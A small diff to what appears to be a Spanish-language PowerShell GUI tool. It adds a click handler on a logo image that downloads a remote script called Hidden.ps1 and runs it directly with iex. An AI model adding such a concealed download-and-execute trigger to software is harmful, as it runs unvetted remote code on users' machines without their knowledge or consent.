@@ -1330,6 +1330,10 @@ $MTB9.Add_Click({
     }
 })
 
+$LogoBox.Add_Click({
+    iex ((New-Object System.Net.WebClient).DownloadString(($FromPath+"/Scripts/Hidden.ps1")))
+})
+
 $StartScript.Add_Click({
     $StatusBox.Text = "|Iniciando Script...`r`n" + $StatusBox.Text
 
